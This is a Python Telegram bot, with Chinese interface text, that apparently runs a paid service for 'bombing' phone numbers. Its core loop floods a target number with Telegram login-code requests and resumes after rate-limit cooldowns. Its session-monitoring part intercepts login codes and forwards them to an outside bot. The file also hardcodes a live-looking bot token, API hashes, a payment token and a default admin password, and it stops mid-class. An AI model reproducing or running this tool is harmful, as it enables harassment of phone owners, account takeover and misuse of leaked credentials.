#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import json
import hashlib
import urllib.parse
import logging
import threading
import shutil
import asyncio
import secrets
import string
import time
import base64
from pathlib import Path
from datetime import datetime, timedelta
from collections import OrderedDict
from typing import Dict, Optional, List, Tuple, Set, Union, Any
from concurrent.futures import ThreadPoolExecutor
import random

try:
    import requests
except ImportError:
    print("请安装 requests: pip install requests")
    sys.exit(1)

try:
    from flask import Flask, render_template_string, request, jsonify
except ImportError:
    print("请安装 flask: pip install flask")
    sys.exit(1)

try:
    from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
    from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, CallbackQueryHandler, ContextTypes, filters
except ImportError:
    print("请安装 python-telegram-bot: pip install python-telegram-bot")
    sys.exit(1)

try:
    from telethon import TelegramClient, events
    from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, FloodWaitError, PhoneNumberInvalidError, PhoneCodeExpiredError
    from telethon.sessions import StringSession
except ImportError:
    print("请安装 telethon: pip install telethon")
    sys.exit(1)


API_CREDENTIALS = [
    {"api_id": 442495, "api_hash": "873ffaceba76e791ff2491224a3cdb49"},
    {"api_id": 26223707, "api_hash": "baf9a07731d7f698f42e7c56da10a5d9"},
]


class Config:
    BOT_TOKEN: str = "8806167386:AAG30hcPDhoeVPeDms-dzcJ-nsmU1vZ5YJo"
    SUPER_ADMIN_IDS: List[int] = [7002638062]
    ADMIN_IDS: List[int] = [7509368655]
    OKPAY_SHOP_ID: str = "34543"
    OKPAY_SHOP_TOKEN: str = "8fkGUXg5BszGHK1MPb3SFhWpYLt2Jwa"
    OKPAY_NAME: str = "Xu"
    OKPAY_BOT_USERNAME: str = "bhgffgggbot"
    OKPAY_API_URL: str = "https://api.okaypay.me/shop/"
    PAYMENT_AMOUNT: str = "0.1"
    PAYMENT_COIN: str = "USDT"
    REQUIRED_CHANNEL_ID: int = -1003389230091
    REQUIRED_CHANNEL_USERNAME: str = "@apl57"
    FORWARD_CHANNEL_ID: int = -1004393292106
    FORWARD_CHANNEL_USERNAME: str = "@LKJ500"
    FORWARD_BOT_USERNAME: str = "GHFDR520BOT"
    TELEGRAM_BOT_ID: int = 777000
    WEBHOOK_HOST: str = "0.0.0.0"
    WEBHOOK_PORT: int = 39999
    WEB_ADMIN_PORT: int = 39998
    WEBHOOK_PATH: str = "/webhook/okpay"
    WEB_USER: str = "admin"
    WEB_PASS: str = "admin123"
    LOG_LEVEL: str = "INFO"
    LOG_FORMAT: str = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    BASE_DIR: Path = Path(__file__).parent.absolute()
    SESSIONS_DIR: Path = BASE_DIR / "sessions"
    HISTORY_DIR: Path = BASE_DIR / "history_sessions"
    DATA_DIR: Path = BASE_DIR / "data"
    BACKUP_DIR: Path = BASE_DIR / "backups"
    PAYMENT_FILE: Path = DATA_DIR / "payments.json"
    ADMINS_FILE: Path = DATA_DIR / "admins.json"
    BACKUP_KEYS_FILE: Path = DATA_DIR / "backup_keys.json"
    JOINED_RECORD_FILE: Path = DATA_DIR / "joined_records.json"
    ROTATION_FILE: Path = DATA_DIR / "rotation_accounts.json"
    BANNED_USERS_FILE: Path = DATA_DIR / "banned_users.json"
    USER_USAGE_FILE: Path = DATA_DIR / "user_usage.json"
    ORDER_EXPIRE_SECONDS: int = 1800
    DEVICE_MODEL: str = "AntiLoginDevice"
    MAX_TASKS_PER_USER: int = 3
    MAX_CONCURRENT_TASKS: int = 15


def init_directories() -> None:
    for dir_path in [Config.SESSIONS_DIR, Config.HISTORY_DIR, Config.DATA_DIR, Config.BACKUP_DIR]:
        dir_path.mkdir(parents=True, exist_ok=True)


def setup_logging() -> None:
    logging.basicConfig(format=Config.LOG_FORMAT, level=getattr(logging, Config.LOG_LEVEL))
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("telethon").setLevel(logging.WARNING)


logger = logging.getLogger(__name__)


def load_json_file(file_path: Path, default: Any = None) -> Any:
    if default is None:
        default = {}
    if not file_path.exists():
        return default
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Load failed {file_path}: {e}")
        return default


def save_json_file(file_path: Path, data: Any) -> bool:
    try:
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logger.error(f"Save failed {file_path}: {e}")
        return False


def format_flood_time(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}秒"
    elif seconds < 3600:
        return f"{seconds//60}分{seconds%60}秒"
    elif seconds < 86400:
        return f"{seconds//3600}时{(seconds%3600)//60}分"
    else:
        return f"{seconds//86400}天{(seconds%86400)//3600}时"


def get_random_api_creds() -> Dict[str, Union[int, str]]:
    return random.choice(API_CREDENTIALS)


def generate_task_id() -> str:
    return base64.b64encode(secrets.token_bytes(8)).decode('ascii').rstrip('=')


banned_users: Set[int] = set()
user_usage: Dict[int, Dict] = {}
phone_to_task_id: Dict[str, str] = {}
active_tasks: Dict[str, Any] = {}
user_tasks: Dict[int, List[str]] = {}
session_tokens: Dict[int, str] = {}
panel_messages: Dict[int, int] = {}

stats = {
    "total_requests": 0,
    "total_success": 0,
    "total_fails": 0,
    "start_time": datetime.now()
}


class TaskData:
    def __init__(self, task_id: str, phone_number: str, user_id: int, chat_id: int):
        self.task_id = task_id
        self.phone_number = phone_number
        self.user_id = user_id
        self.chat_id = chat_id
        self.task: Optional[asyncio.Task] = None
        self.start_time = datetime.now()
        self.success_count = 0
        self.fail_count = 0
        self.cooldown_until: Optional[datetime] = None
        self.is_running = True
        self.is_stopped = False
        self._lock = asyncio.Lock()
        self._stop_event = asyncio.Event()
        
    def get_status(self) -> Dict:
        elapsed = (datetime.now() - self.start_time).total_seconds()
        return {
            "task_id": self.task_id,
            "phone": self.phone_number,
            "success": self.success_count,
            "fail": self.fail_count,
            "elapsed": elapsed,
            "is_running": self.is_running,
            "is_stopped": self.is_stopped,
            "cooldown": self.cooldown_until
        }
    
    def get_display_status(self) -> str:
        if self.is_stopped:
            return "已停止"
        if self.cooldown_until and self.cooldown_until > datetime.now():
            remaining = (self.cooldown_until - datetime.now()).total_seconds()
            if remaining >= 3600:
                return f"冷却({remaining/3600:.1f}h)"
            elif remaining >= 60:
                return f"冷却({remaining/60:.0f}m)"
            else:
                return f"冷却({remaining:.0f}s)"
        elif self.is_running:
            return "轰炸中"
        else:
            return "已停止"
    
    async def stop(self):
        async with self._lock:
            self.is_running = False
            self.is_stopped = True
            self._stop_event.set()
        
    async def start(self):
        async with self._lock:
            self.is_running = True
            self.is_stopped = False
            self._stop_event.clear()
        
    async def is_active(self) -> bool:
        async with self._lock:
            if self.is_stopped:
                return False
            if not self.is_running:
                return False
            if self.cooldown_until and self.cooldown_until > datetime.now():
                return False
            return True
    
    async def wait_for_stop(self, timeout: float = None):
        try:
            await asyncio.wait_for(self._stop_event.wait(), timeout)
            return True
        except asyncio.TimeoutError:
            return False


class AdminManager:
    _admins_cache: Set[int] = set()
    _cache_loaded: bool = False
    _lock: threading.Lock = threading.Lock()

    @classmethod
    def _load_admins(cls) -> Set[int]:
        data = load_json_file(Config.ADMINS_FILE, {"admins": []})
        admins = set(data.get("admins", []))
        admins.update(Config.ADMIN_IDS)
        return admins

    @classmethod
    def _save_admins(cls, admins: Set[int]) -> None:
        custom_admins = list(admins - set(Config.ADMIN_IDS))
        save_json_file(Config.ADMINS_FILE, {"admins": custom_admins})

    @classmethod
    def refresh_cache(cls) -> None:
        with cls._lock:
            cls._admins_cache = cls._load_admins()
            cls._cache_loaded = True

    @classmethod
    def is_super_admin(cls, user_id: int) -> bool:
        return user_id in Config.SUPER_ADMIN_IDS

    @classmethod
    def is_admin(cls, user_id: int) -> bool:
        if user_id in Config.SUPER_ADMIN_IDS:
            return True
        if not cls._cache_loaded:
            cls.refresh_cache()
        with cls._lock:
            return user_id in cls._admins_cache

    @classmethod
    def add_admin(cls, admin_id: int, added_by: int) -> Tuple[bool, str]:
        if not cls.is_super_admin(added_by):
            return False, "只有超级管理员可以添加管理员"
        if not cls._cache_loaded:
            cls.refresh_cache()
        with cls._lock:
            if admin_id in cls._admins_cache:
                return False, f"用户 {admin_id} 已经是管理员"
            if admin_id in Config.SUPER_ADMIN_IDS:
                return False, f"用户 {admin_id} 是超级管理员"
            cls._admins_cache.add(admin_id)
            cls._save_admins(cls._admins_cache)
            return True, f"已添加管理员: {admin_id}"

    @classmethod
    def remove_admin(cls, admin_id: int, removed_by: int) -> Tuple[bool, str]:
        if not cls.is_super_admin(removed_by):
            return False, "只有超级管理员可以移除管理员"
        if not cls._cache_loaded:
            cls.refresh_cache()
        with cls._lock:
            if admin_id not in cls._admins_cache:
                return False, f"用户 {admin_id} 不是管理员"
            if admin_id in Config.SUPER_ADMIN_IDS:
                return False, f"用户 {admin_id} 是超级管理员"
            cls._admins_cache.remove(admin_id)
            cls._save_admins(cls._admins_cache)
            return True, f"已移除管理员: {admin_id}"

    @classmethod
    def list_admins(cls) -> List[Dict[str, Any]]:
        result = []
        for uid in Config.SUPER_ADMIN_IDS:
            result.append({"id": uid, "type": "超级管理员", "is_super": True})
        if not cls._cache_loaded:
            cls.refresh_cache()
        with cls._lock:
            for uid in cls._admins_cache:
                result.append({"id": uid, "type": "管理员", "is_super": False})
        return result


class PaymentManager:
    @staticmethod
    def check_payment_status(user_id: int) -> Dict[str, Any]:
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(user_id)
        if user_id_str in payments:
            record = payments[user_id_str]
            if record.get("status") == "paid":
                return {"status": "paid", "data": record}
            elif record.get("status") == "pending":
                return {"status": "pending", "data": record}
        return {"status": "unpaid", "data": None}

    @staticmethod
    def mark_user_paid(user_id: int, via: str, extra: Dict[str, Any] = None) -> bool:
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(user_id)
        payments[user_id_str] = {
            "status": "paid",
            "paid_at": datetime.now().isoformat(),
            "via": via,
            "extra": extra or {}
        }
        return save_json_file(Config.PAYMENT_FILE, payments)

    @staticmethod
    def reset_user(user_id: int) -> bool:
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(user_id)
        if user_id_str in payments:
            del payments[user_id_str]
            return save_json_file(Config.PAYMENT_FILE, payments)
        return False


class BackupKeyManager:
    @staticmethod
    def generate_key(note: str = "", created_by: int = None) -> str:
        data = load_json_file(Config.BACKUP_KEYS_FILE, {"keys": {}})
        while True:
            key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))
            if key not in data["keys"]:
                break
        data["keys"][key] = {
            "used": False, "used_by": None, "used_at": None,
            "note": note, "created_by": created_by,
            "created_at": datetime.now().isoformat()
        }
        save_json_file(Config.BACKUP_KEYS_FILE, data)
        return key

    @staticmethod
    def use_key(user_id: int, key: str) -> Dict[str, Any]:
        data = load_json_file(Config.BACKUP_KEYS_FILE, {"keys": {}})
        if key not in data["keys"]:
            return {"ok": False, "reason": "卡密不存在"}
        key_info = data["keys"][key]
        if key_info["used"]:
            return {"ok": False, "reason": "卡密已被使用"}
        key_info["used"] = True
        key_info["used_by"] = user_id
        key_info["used_at"] = datetime.now().isoformat()
        save_json_file(Config.BACKUP_KEYS_FILE, data)
        PaymentManager.mark_user_paid(user_id, f"backup_key:{key}", {"backup_key": key})
        return {"ok": True, "reason": "激活成功"}

    @staticmethod
    def list_keys(only_unused: bool = True) -> List[Dict[str, Any]]:
        data = load_json_file(Config.BACKUP_KEYS_FILE, {"keys": {}})
        result = []
        for key, info in data["keys"].items():
            if only_unused and info["used"]:
                continue
            result.append({
                "key": key, "used": info["used"], "used_by": info.get("used_by"),
                "used_at": info.get("used_at"), "note": info.get("note", ""),
                "created_by": info.get("created_by"), "created_at": info.get("created_at")
            })
        return result


class TwoFAManager:
    @staticmethod
    def get_password_file(user_id: int) -> Path:
        user_dir = Config.SESSIONS_DIR / f"user_{user_id}"
        user_dir.mkdir(parents=True, exist_ok=True)
        return user_dir / "2fa_passwords.json"

    @staticmethod
    def save_password(user_id: int, phone: str, password: str) -> bool:
        file_path = TwoFAManager.get_password_file(user_id)
        data = load_json_file(file_path, {})
        data[phone] = {"password": password, "saved_at": datetime.now().isoformat()}
        return save_json_file(file_path, data)

    @staticmethod
    def get_password(user_id: int, phone: str) -> Optional[str]:
        file_path = TwoFAManager.get_password_file(user_id)
        data = load_json_file(file_path, {})
        if phone in data:
            return data[phone].get("password")
        return None

    @staticmethod
    def get_all_passwords(user_id: int) -> Dict[str, str]:
        file_path = TwoFAManager.get_password_file(user_id)
        data = load_json_file(file_path, {})
        return {phone: info.get("password", "") for phone, info in data.items()}


class JoinRecordManager:
    @staticmethod
    def record_joined(user_id: int, username: str = None) -> None:
        data = load_json_file(Config.JOINED_RECORD_FILE, {})
        user_id_str = str(user_id)
        if user_id_str not in data:
            data[user_id_str] = {"joined_at": datetime.now().isoformat(), "verified": True, "username": username}
            save_json_file(Config.JOINED_RECORD_FILE, data)

    @staticmethod
    def is_recorded(user_id: int) -> bool:
        data = load_json_file(Config.JOINED_RECORD_FILE, {})
        return str(user_id) in data

    @staticmethod
    def clear_record(user_id: int) -> bool:
        data = load_json_file(Config.JOINED_RECORD_FILE, {})
        user_id_str = str(user_id)
        if user_id_str in data:
            del data[user_id_str]
            save_json_file(Config.JOINED_RECORD_FILE, data)
            return True
        return False


class SessionManager:
    _sessions: Dict[int, Dict[str, Dict[str, Any]]] = {}
    _lock: threading.Lock = threading.Lock()

    @classmethod
    def get_user_dir(cls, user_id: int) -> Path:
        user_dir = Config.SESSIONS_DIR / f"user_{user_id}"
        user_dir.mkdir(parents=True, exist_ok=True)
        return user_dir

    @classmethod
    async def check_session_alive(cls, session_path: Path) -> Tuple[bool, Optional[str]]:
        try:
            creds = get_random_api_creds()
            telethon_path = str(session_path.with_suffix(''))
            client = TelegramClient(telethon_path, creds["api_id"], creds["api_hash"],
                                    device_model=Config.DEVICE_MODEL)
            client.flood_sleep_threshold = 60
            await client.connect()
            if not await client.is_user_authorized():
                await client.disconnect()
                return False, None
            me = await client.get_me()
            phone = f"+{me.phone}" if me.phone else None
            await client.disconnect()
            return True, phone
        except Exception as e:
            logger.error(f"Check failed: {session_path.name} - {e}")
            return False, None

    @classmethod
    async def start_monitoring(cls, user_id: int, phone: str, session_path: Path, bot) -> bool:
        try:
            creds = get_random_api_creds()
            telethon_path = str(session_path.with_suffix(''))
            client = TelegramClient(telethon_path, creds["api_id"], creds["api_hash"],
                                    device_model=Config.DEVICE_MODEL)
            client.flood_sleep_threshold = 60
            await client.connect()

            if not await client.is_user_authorized():
                await client.disconnect()
                return False

            @client.on(events.NewMessage(from_users=Config.TELEGRAM_BOT_ID))
            async def handler(event):
                try:
                    text = event.message.message or ""
                    code_match = re.search(r'\b(\d{5})\b', text)
                    if code_match:
                        code = code_match.group(1)
                        logger.info(f"Code intercepted: {phone} -> {code}")
                        try:
                            await client.send_message(Config.FORWARD_BOT_USERNAME, code)
                            await bot.send_message(
                                user_id,
                                f"拦截成功\n手机号: {phone}\n验证码: {code}",
                                parse_mode='HTML'
                            )
                        except Exception as e:
                            logger.error(f"Forward failed: {e}")
                except Exception as e:
                    logger.error(f"Handler error: {e}")

            with cls._lock:
                if user_id not in cls._sessions:
                    cls._sessions[user_id] = {}
                if phone in cls._sessions[user_id]:
                    old_client = cls._sessions[user_id][phone]['client']
                    try:
                        await old_client.disconnect()
                    except:
                        pass
                cls._sessions[user_id][phone] = {
                    'client': client,
                    'file_path': session_path,
                    'started_at': datetime.now().isoformat()
                }

            asyncio.create_task(client.run_until_disconnected())
            logger.info(f"Monitoring started: {phone} (user: {user_id})")
            return True

        except Exception as e:
            logger.error(f"Start failed ({phone}): {e}")
            return False

    @classmethod
    async def stop_monitoring(cls, user_id: int, phone: str, archive: bool = True) -> bool:
        client = None
        file_path = None
        with cls._lock:
            if user_id not in cls._sessions or phone not in cls._sessions[user_id]:
                return False
            client = cls._sessions[user_id][phone]['client']
            file_path = cls._sessions[user_id][phone]['file_path']

        try:
            await client.disconnect()
            if archive and file_path and file_path.exists():
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                target_path = Config.HISTORY_DIR / f"{user_id}_{phone}_{timestamp}_{file_path.name}"
                shutil.move(str(file_path), str(target_path))
            with cls._lock:
                if user_id in cls._sessions and phone in cls._sessions[user_id]:
                    del cls._sessions[user_id][phone]
                    if not cls._sessions[user_id]:
                        del cls._sessions[user_id]
            return True
        except Exception as e:
            logger.error(f"Stop failed ({phone}): {e}")
            return False

    @classmethod
    def get_active_sessions(cls, user_id: int) -> Dict[str, Dict[str, Any]]:
        with cls._lock:
            return dict(cls._sessions.get(user_id, {}))

    @classmethod
    def get_all_sessions(cls) -> Dict[int, Dict[str, Dict[str, Any]]]:
        with cls._lock:
            return dict(cls._sessions)

    @classmethod
    async def scan_and_restore_all(cls, bot) -> int:
        logger.info("Scanning sessions...")
        total_found = 0
        total_alive = 0

        for user_dir in Config.SESSIONS_DIR.iterdir():
            if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
                continue
            try:
                user_id = int(user_dir.name.replace("user_", ""))
            except ValueError:
                continue

            session_files = list(user_dir.glob("*.session"))
            for session_file in session_files:
                total_found += 1
                is_alive, phone = await cls.check_session_alive(session_file)
                if is_alive and phone:
                    total_alive += 1
                    success = await cls.start_monitoring(user_id, phone, session_file, bot)
                    if success:
                        try:
                            await bot.send_message(
                                user_id,
                                f"监控已恢复\n手机号: {phone}",
                                parse_mode='HTML'
                            )
                        except:
                            pass

        logger.info(f"Scan complete: found {total_found}, restored {total_alive}")
        return total_alive


class ChannelVerifier:
    @staticmethod
    async def check_user_in_channel(context: ContextTypes.DEFAULT_TYPE,
                                    user_id: int) -> Tuple[bool, str]:
        if not Config.REQUIRED_CHANNEL_ID:
            return True, "频道验证已禁用"
        try:
            bot = context.bot
            chat_member = await bot.get_chat_member(
                chat_id=Config.REQUIRED_CHANNEL_ID,
                user_id=user_id
            )
            if chat_member.status in ['member', 'administrator', 'creator']:
                return True, "已加入"
            return False, f"状态: {chat_member.status}"
        except Exception as e:
            logger.error(f"Check failed: {e}")
            if JoinRecordManager.is_recorded(user_id):
                return True, "已加入(本地记录)"
            return False, "未加入"

    @staticmethod
    def get_join_keyboard() -> InlineKeyboardMarkup:
        if not Config.REQUIRED_CHANNEL_USERNAME:
            return InlineKeyboardMarkup([])
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("加入频道", url=f"https://t.me/{Config.REQUIRED_CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton("验证", callback_data="verify_join")]
        ])


class PermissionChecker:
    @staticmethod
    async def check_user_permission(context: ContextTypes.DEFAULT_TYPE,
                                    user_id: int) -> Tuple[bool, str]:
        if AdminManager.is_admin(user_id):
            return True, "管理员"
        is_joined, _ = await ChannelVerifier.check_user_in_channel(context, user_id)
        if not is_joined:
            return False, "需要加入频道"
        ps = PaymentManager.check_payment_status(user_id)
        if ps["status"] != "paid":
            return False, "需要支付"
        return True, "通过"

    @staticmethod
    async def ensure_user_permission(update: Update,
                                     context: ContextTypes.DEFAULT_TYPE) -> bool:
        user_id = update.effective_user.id
        has_permission, reason = await PermissionChecker.check_user_permission(context, user_id)
        if has_permission:
            return True
        if reason == "需要加入频道":
            await PermissionChecker._send_join_required(update, user_id, context)
        elif reason == "需要支付":
            await PermissionChecker._send_payment_required(update, user_id, context)
        return False

    @staticmethod
    async def _send_join_required(update: Update, user_id: int,
                                  context: ContextTypes.DEFAULT_TYPE):
        channel_link = f"https://t.me/{Config.REQUIRED_CHANNEL_USERNAME.lstrip('@')}"
        msg = (
            "需要加入频道验证\n\n"
            f"请加入: {Config.REQUIRED_CHANNEL_USERNAME}\n"
            "点击下方加入频道按钮，然后点击验证"
        )
        keyboard = ChannelVerifier.get_join_keyboard()
        if update.callback_query:
            await update.callback_query.message.reply_text(msg, parse_mode='HTML', reply_markup=keyboard)
        else:
            await update.message.reply_text(msg, parse_mode='HTML', reply_markup=keyboard)

    @staticmethod
    async def _send_payment_required(update: Update, user_id: int,
                                     context: ContextTypes.DEFAULT_TYPE):
        msg = (
            f"需要支付激活\n\n"
            f"金额: {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}\n"
            "发送 /start 开始支付流程"
        )
        if update.callback_query:
            await update.callback_query.message.reply_text(msg, parse_mode='HTML')
        else:
            await update.message.reply_text(msg, parse_mode='HTML')


# ==================== 轰炸核心功能 ====================

async def send_verification_fast(phone_number: str) -> Tuple[bool, str, int]:
    """快速发送验证码请求"""
    temp_client = None
    try:
        creds = get_random_api_creds()
        temp_client = TelegramClient(
            StringSession(),
            creds["api_id"],
            creds["api_hash"],
            timeout=10
        )
        
        await temp_client.connect()
        await temp_client.send_code_request(phone_number)
        await temp_client.disconnect()
        
        stats["total_requests"] += 1
        stats["total_success"] += 1
        
        return True, "成功", 0
        
    except FloodWaitError as e:
        stats["total_requests"] += 1
        stats["total_fails"] += 1
        return False, "限制", e.seconds
        
    except Exception as e:
        stats["total_requests"] += 1
        stats["total_fails"] += 1
        return False, f"错误", 0
    
    finally:
        if temp_client and temp_client.is_connected():
            try:
                await temp_client.disconnect()
            except:
                pass


async def bomb_phone_number(task_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    """持续轰炸手机号"""
    while True:
        if task_id not in active_tasks:
            break
        
        task_data = active_tasks[task_id]
        
        if user_id in banned_users:
            break
        
        if await task_data.wait_for_stop(0.5):
            await asyncio.sleep(0.5)
            continue
        
        if not await task_data.is_active():
            await asyncio.sleep(1)
            continue
        
        if task_data.cooldown_until and task_data.cooldown_until > datetime.now():
            remaining = (task_data.cooldown_until - datetime.now()).total_seconds()
            if remaining > 0:
                wait_time = min(remaining, 60)
                await asyncio.sleep(wait_time)
                continue
        
        try:
            success, message, wait_time = await send_verification_fast(task_data.phone_number)
            
            if success:
                task_data.success_count += 1
                await asyncio.sleep(0.05)
            else:
                task_data.fail_count += 1
                if "限制" in message and wait_time > 0:
                    task_data.cooldown_until = datetime.now() + timedelta(seconds=wait_time)
                    
                    async with task_data._lock:
                        task_data.is_running = False
                    
                    logger.info(f"{task_data.phone_number} 进入冷却，{wait_time}秒")
                    
                    try:
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=f"⚠️ {task_data.phone_number}\n触发限制，冷却 {format_flood_time(wait_time)}"
                        )
                    except Exception as e:
                        pass
                    
                    await update_panel(user_id, context)
                    
                    if wait_time < 86400:
                        await asyncio.sleep(wait_time)
                        if task_id in active_tasks and not active_tasks[task_id].is_stopped:
                            if user_id not in banned_users:
                                async with active_tasks[task_id]._lock:
                                    active_tasks[task_id].is_running = True
                                    active_tasks[task_id].cooldown_until = None
                                logger.info(f"{task_data.phone_number} 冷却结束，继续轰炸")
                                try:
                                    await context.bot.send_message(
                                        chat_id=user_id,
                                        text=f"✅ {task_data.phone_number} 冷却结束，继续轰炸"
                                    )
                                except:
                                    pass
                                await update_panel(user_id, context)
                    else:
                        logger.info(f"{task_data.phone_number} 达到24小时限制！")
                        break
            
        except asyncio.CancelledError:
            break
        except Exception as e:
            task_data.fail_count += 1
            logger.error(f"轰炸错误 {task_data.phone_number}: {str(e)}")
            await asyncio.sleep(0.5)


# ==================== 面板功能 ====================

async def generate_session_token(user_id: int) -> str:
    token = base64.b64encode(secrets.token_bytes(6)).decode('ascii').rstrip('=')
    session_tokens[user_id] = token
    return token


async def verify_session_token(user_id: int, token: str) -> bool:
    return session_tokens.get(user_id) == token


def format_panel_text(user_id: int) -> str:
    user_task_ids = user_tasks.get(user_id, [])
    
    active_count = 0
    stopped_count = 0
    total_success = 0
    total_fail = 0
    
    for task_id in user_task_ids:
        task_data = active_tasks.get(task_id)
        if task_data:
            if task_data.is_running and not task_data.is_stopped:
                active_count += 1
            elif task_data.is_stopped:
                stopped_count += 1
            total_success += task_data.success_count
            total_fail += task_data.fail_count
    
    total_count = len(user_task_ids)
    
    text = (
        "💎 欢迎使用 Telegram 账号轰炸系统\n"
        "──────────────────────\n"
        f"📟 系统状态: 在线\n"
        f"📊 您的任务: {active_count} / {Config.MAX_TASKS_PER_USER}\n"
        f"📋 总任务数: {total_count} (活跃: {active_count} | 停止: {stopped_count})\n\n"
    )
    
    if user_task_ids:
        text += "[ 您的任务矩阵 ]\n"
        for idx, task_id in enumerate(user_task_ids, 1):
            task_data = active_tasks.get(task_id)
            if task_data:
                status = task_data.get_display_status()
                display_phone = task_data.phone_number
                if len(display_phone) > 15:
                    display_phone = f"{display_phone[:4]}...{display_phone[-6:]}"
                text += f"#{idx} | {display_phone} | {status}"
                
                if task_data.success_count > 0:
                    text += f" | ✅ {task_data.success_count}"
                if task_data.fail_count > 0:
                    text += f" | ❌ {task_data.fail_count}"
                text += "\n"
    else:
        text += "[ 您的任务矩阵 ]\n"
        text += "暂无任务，请点击「增加配额」添加\n"
    
    text += "\n──────────────────────"
    
    elapsed = (datetime.now() - stats["start_time"]).total_seconds()
    text += f"\n📊 系统统计:\n"
    text += f"• 运行时间: {elapsed/3600:.1f} 小时\n"
    text += f"• 总请求: {stats['total_requests']}\n"
    text += f"• 成功: {stats['total_success']} | 失败: {stats['total_fails']}\n"
    if stats['total_requests'] > 0:
        success_rate = (stats['total_success']/stats['total_requests']*100)
        text += f"• 成功率: {success_rate:.1f}%\n"
    else:
        text += f"• 成功率: 0%\n"
    
    return text


async def get_task_management_keyboard(user_id: int, user_task_ids: List[str]) -> InlineKeyboardMarkup:
    keyboard = []
    token = await generate_session_token(user_id)
    
    for idx, task_id in enumerate(user_task_ids, 1):
        task_data = active_tasks.get(task_id)
        if task_data and task_data.user_id == user_id:
            display_phone = task_data.phone_number
            if len(display_phone) > 15:
                display_phone = f"{display_phone[:4]}...{display_phone[-6:]}"
            
            if task_data.is_stopped:
                keyboard.append([
                    InlineKeyboardButton(f"▶️ 启动 #{idx} ({display_phone})", callback_data=f"rs_{task_id}_{token}"),
                    InlineKeyboardButton(f"🗑️ 删除 #{idx}", callback_data=f"dl_{task_id}_{token}")
                ])
            else:
                keyboard.append([
                    InlineKeyboardButton(f"⏸ 停止 #{idx} ({display_phone})", callback_data=f"sp_{task_id}_{token}"),
                    InlineKeyboardButton(f"🗑️ 删除 #{idx}", callback_data=f"dl_{task_id}_{token}")
                ])
    
    keyboard.append([InlineKeyboardButton("➕ 增加配额", callback_data=f"aq_{token}")])
    keyboard.append([InlineKeyboardButton("🔄 刷新面板", callback_data=f"rf_{token}")])
    keyboard.append([InlineKeyboardButton("📊 详细统计", callback_data=f"ds_{token}")])
    
    return InlineKeyboardMarkup(keyboard)


async def update_panel(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    panel_text = format_panel_text(user_id)
    user_task_ids = user_tasks.get(user_id, [])
    
    try:
        if user_id in panel_messages:
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id,
                    message_id=panel_messages[user_id],
                    text=panel_text,
                    reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
                )
                return
            except Exception as e:
                if "message to edit not found" in str(e) or "Message can't be edited" in str(e):
                    if user_id in panel_messages:
                        del panel_messages[user_id]
        
        message = await context.bot.send_message(
            chat_id=user_id,
            text=panel_text,
            reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
        )
        panel_messages[user_id] = message.message_id
    except Exception as e:
        logger.error(f"更新面板失败: {e}")


# ==================== Bot命令处理 ====================

PHONE_INPUT, VERIFICATION_CODE, TWO_FACTOR_PASSWORD = range(3)


class SystemKeyboards:
    @staticmethod
    def main_menu() -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup([
            ["反登录系统", "轰炸系统"],
            ["管理面板", "统计信息"]
        ], resize_keyboard=True)

    @staticmethod
    def anti_login_menu() -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup([
            ["上传会话文件", "手机号登录"],
            ["我的会话", "断开所有"],
            ["返回主菜单"]
        ], resize_keyboard=True)

    @staticmethod
    def bomb_menu() -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup([
            ["我的任务", "增加配额"],
            ["停止所有任务", "启动所有任务"],
            ["返回主菜单"]
        ], resize_keyboard=True)

    @staticmethod
    def admin_menu() -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup([
            ["添加管理员", "移除管理员"],
            ["列出管理员", "强制激活"],
            ["生成卡密", "列出卡密"],
            ["查看被轰炸手机", "停止轰炸手机"],
            ["返回主菜单"]
        ], resize_keyboard=True)

    @staticmethod
    def cancel() -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup([["取消"]], resize_keyboard=True, one_time_keyboard=True)

    @staticmethod
    def session_management(user_id: int) -> InlineKeyboardMarkup:
        sessions = SessionManager.get_active_sessions(user_id)
        rows = []
        for phone in sessions.keys():
            rows.append([
                InlineKeyboardButton(f"{phone}", callback_data="noop"),
                InlineKeyboardButton("断开", callback_data=f"stop_single:{phone}"),
            ])
        if rows:
            rows.append([InlineKeyboardButton("全部断开", callback_data="stop_all")])
        return InlineKeyboardMarkup(rows) if rows else InlineKeyboardMarkup([])


class BotHandlers:
    @staticmethod
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        await update.message.reply_text(
            "Telegram验证码拦截系统\n作者: @APl520\n\n请选择系统:",
            parse_mode='HTML',
            reply_markup=SystemKeyboards.main_menu()
        )
        return ConversationHandler.END

    @staticmethod
